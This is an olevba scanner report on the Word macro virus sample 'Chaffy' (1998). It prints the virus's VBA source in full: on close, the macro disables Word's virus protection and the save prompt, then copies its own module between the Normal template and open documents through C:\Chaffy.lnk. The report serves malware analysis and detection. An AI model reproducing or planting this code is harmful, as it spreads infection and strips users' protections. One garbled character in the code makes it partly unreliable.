olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Chaffy.bas 
in file: Virus.MSWord.Fs.t - OLE stream: 'Macros/VBA/Chaffy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Chaffy
Sub AutoClose()
    On Error Resume Next
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Set ν = NormalTemplate.VBProject.VBComponents
    Set υ = ActiveDocument.VBProject.VBComponents
    Select Case �
        Case ν("Chaffy").Name
            υ("Chaffy").Export "C:\Chaffy.lnk": Set α = ν
        Case υ("Chaffy").Name
            ν("Chaffy").Export "C:\Chaffy.lnk": Set α = υ
        Case Else
            Exit Sub
    End Select
        α.Import "C:\Chaffy.lnk"
        ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Chaffy.lnk          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

